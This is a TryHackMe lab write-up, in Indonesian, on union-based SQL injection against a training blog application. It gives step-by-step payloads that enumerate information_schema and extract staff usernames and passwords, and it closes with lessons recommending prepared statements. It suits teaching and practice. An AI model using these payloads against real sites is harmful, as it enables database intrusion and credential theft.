# SQL Injection Examples Machine — In-Band SQLi (Union-Based)

**Date:** 2026-05-17
**Platform:** TryHackMe
**Difficulty:** Easy
**Category:** Web

---

## Target

Web application berbasis blog sederhana yang terhubung ke database MySQL.
Aplikasi mengambil artikel berdasarkan parameter `id` di URL query string
dan menampilkannya langsung ke halaman tanpa validasi input yang memadai.

## Vulnerability

Input dari pengguna (parameter `id`) dimasukkan langsung ke dalam SQL query
tanpa sanitasi atau parameterization. Hal ini memungkinkan penyerang
memanipulasi struktur query SQL yang dieksekusi oleh database.

Akar masalahnya ada di cara developer membangun query — menggabungkan
input pengguna langsung ke string SQL alih-alih menggunakan
prepared statements atau parameterized queries.

## Tools Used

- Browser / Mock Browser (TryHackMe Lab)
- Manual SQL Injection (tanpa tools otomatis)
- Pengetahuan SQL dasar (SELECT, UNION, WHERE, LIKE)

---

## Exploitation Steps

### Step 1 — Identifikasi Entry Point

Target URL menggunakan parameter `id` untuk mengambil artikel dari database.

```
https://website.thm/article?id=1
```

SQL query yang berjalan di balik layar:

```
SELECT * from blog where id=1 and private=0 LIMIT 1;
```

Query ini mengambil artikel dengan id tertentu yang statusnya publik (private=0).

### Step 2 — Konfirmasi Kerentanan

Menambahkan karakter apostrophe setelah nilai id untuk memecah struktur query:

```
https://website.thm/article?id=1'
```

Aplikasi mengembalikan SQL error di browser — ini mengkonfirmasi bahwa
input langsung dimasukkan ke query tanpa sanitasi apapun.

### Step 3 — Menentukan Jumlah Kolom

Untuk menggunakan UNION, jumlah kolom harus cocok dengan query aslinya.
Menambahkan kolom satu per satu sampai error hilang:

```
1 UNION SELECT 1
```
Hasil: error — jumlah kolom tidak cocok.

```
1 UNION SELECT 1,2
```
Hasil: error — masih tidak cocok.

```
1 UNION SELECT 1,2,3
```
Hasil: berhasil — error hilang, tabel memiliki 3 kolom (id, username, password).

### Step 4 — Mengosongkan Query Pertama

Mengubah id dari 1 ke 0 agar query asli tidak mengembalikan hasil,
sehingga hanya data dari UNION yang tampil di halaman:

```
0 UNION SELECT 1,2,3
```

Halaman sekarang menampilkan nilai 1, 2, dan 3 dari UNION kita.

### Step 5 — Mendapatkan Nama Database

Mengganti angka 3 (posisi kolom ke-3) dengan fungsi database():

```
0 UNION SELECT 1,2,database()
```

Hasil: nama database yang aktif adalah **sqli_one**.

### Step 6 — Enumerasi Tabel

Menggunakan information_schema (database metadata bawaan MySQL) untuk
mendapatkan daftar semua tabel di dalam database sqli_one:

```
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

Hasil: ditemukan dua tabel — **article** dan **staff_users**.

Tabel yang menarik untuk diselidiki lebih lanjut adalah staff_users.

### Step 7 — Enumerasi Kolom

Menggunakan information_schema.columns untuk mendapatkan
struktur kolom dari tabel staff_users:

```
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

Hasil: tabel staff_users memiliki tiga kolom — **id**, **password**, **username**.

### Step 8 — Ekstraksi Data

Mengambil seluruh isi kolom username dan password dari tabel staff_users.
Menggunakan group_concat dengan SEPARATOR HTML br agar mudah dibaca:

```
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

Hasil: seluruh kredensial berhasil diekstrak dari database.

---

## Proof

Tiga akun berhasil ditemukan dari tabel staff_users:

```
admin : [redacted]
martin : [redacted]
jim : [redacted]
```

Challenge Level 1 meminta password milik user martin.
Password tersebut dimasukkan ke form Answer dan berhasil dikonfirmasi.

Level 1 — COMPLETED.

---

## Catatan Teknis Penting

**Kenapa angka 1,2,3 dipakai sebagai placeholder?**
UNION membutuhkan jumlah kolom yang sama antara dua SELECT.
Angka 1, 2, 3 hanyalah nilai dummy untuk memenuhi syarat tersebut.
Setelah jumlah kolom diketahui, salah satu angka bisa diganti
dengan fungsi yang ingin kita eksekusi (misal: database()).

**Kenapa pakai id=0?**
Jika id=1, query asli mengembalikan artikel yang valid dan website
menampilkan artikel itu (mengambil hasil pertama). Dengan id=0,
tidak ada artikel yang cocok sehingga hanya hasil UNION yang tampil.

**Apa itu information_schema?**
Database bawaan (built-in) MySQL yang berisi metadata semua database,
tabel, dan kolom di server tersebut. Semua user bisa mengaksesnya
secara default — inilah yang membuat SQLi sangat berbahaya karena
penyerang bisa memetakan seluruh struktur database dari sini.

---

## Lessons Learned

- SQL Injection terjadi ketika input pengguna tidak divalidasi sebelum
  dimasukkan ke query — bukan kelemahan SQL itu sendiri, tapi cara
  developer menggunakannya.

- Urutan eksploitasi Union-Based SQLi selalu sama: cari kolom dulu,
  kosongkan query asli, baru ambil data yang diinginkan.

- information_schema adalah titik awal enumerasi database yang sangat
  powerful karena berisi peta lengkap seluruh struktur database.

- group_concat() sangat berguna untuk mengambil banyak baris sekaligus
  dalam satu output string.

- Tanda -- sangat krusial untuk men-comment out sisa query asli agar
  tidak menyebabkan error setelah kita menyisipkan payload.

- Perbedaan In-Band vs Blind SQLi ada di cara membaca hasilnya —
  In-Band langsung tampil di halaman, Blind hanya memberikan sinyal
  tidak langsung (perubahan tampilan atau jeda waktu).

- Pencegahan terbaik adalah Prepared Statements karena struktur SQL
  dan data pengguna dipisahkan sejak awal — input pengguna tidak
  pernah bisa menjadi bagian dari instruksi SQL.